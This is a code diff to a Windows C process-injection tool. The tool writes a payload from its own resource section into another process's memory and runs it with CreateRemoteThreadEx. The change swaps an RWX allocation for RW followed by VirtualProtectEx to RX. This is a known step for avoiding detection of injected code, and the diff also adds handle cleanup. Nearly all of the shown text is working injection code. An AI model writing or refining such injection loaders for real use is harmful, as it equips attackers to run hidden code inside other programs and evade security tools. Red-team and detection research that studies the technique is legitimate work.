@@ -57,7 +57,7 @@ int main(int argc, char* argv[]) {
 	}
 	printf_s("[+] Got a handle to process successfully! \\------ (0x%p)\n", hProc);
 
-	if (!(lpAddress = VirtualAllocEx(hProc, NULL, dSizeofRsrc, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE))) {
+	if (!(lpAddress = VirtualAllocEx(hProc, NULL, dSizeofRsrc, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) {
 		printf_s("[-] Failed to allocated memory! \\------ (%ld)", GetLastError());
 		return EXIT_FAILURE;
 	}
@@ -76,6 +76,13 @@ int main(int argc, char* argv[]) {
 	}
 	printf_s("[+] Written dll to allocated memory successfully! \\------ (0x%p)\n", lpAddress);
 
+	DWORD oldProtect = NULL;
+	if (!VirtualProtectEx(hProc, lpAddress, dSizeofRsrc, PAGE_EXECUTE_READ, &oldProtect)) {
+		printf_s("[-] Failed to change memory protection! \\------ (%ld)\n", GetLastError());
+		return EXIT_FAILURE;
+	}
+	printf_s("[+] Memory region is set to RX! \\------ (0x%p)\n", lpAddress);
+
 	hThread = CreateRemoteThreadEx(hProc, NULL, NULL, (LPTHREAD_START_ROUTINE)lpAddress, NULL, NULL, NULL, &TID);
 	if (hThread == NULL) {
 		printf_s("[-] Failed to execute remote thread! \\------ (%ld)\n", GetLastError());
@@ -83,11 +90,18 @@ int main(int argc, char* argv[]) {
 	}
 	printf_s("[+] Remote thread executed successfully!! \\------ (0x%p)\n", hThread);
 
-	printf_s("[+] waiting for the thread to finish execution!\n");
+	printf_s("[+] Waiting for the thread to finish execution!\n");
 	WaitForSingleObject(hThread, INFINITE);
 
-	CloseHandle(hThread);
-	CloseHandle(hProc);
+	printf_s("[+] Cleaning up...\n");
+	if (hRsrc)
+		CloseHandle(hRsrc);
+	if(hLoadRsrc)
+		CloseHandle(hLoadRsrc);
+	if (hThread)
+		CloseHandle(hThread);
+	if (hProc)
+		CloseHandle(hProc);
 
 	printf_s("[+] Payload injected successfully from resource section!\n");
 	return 0;
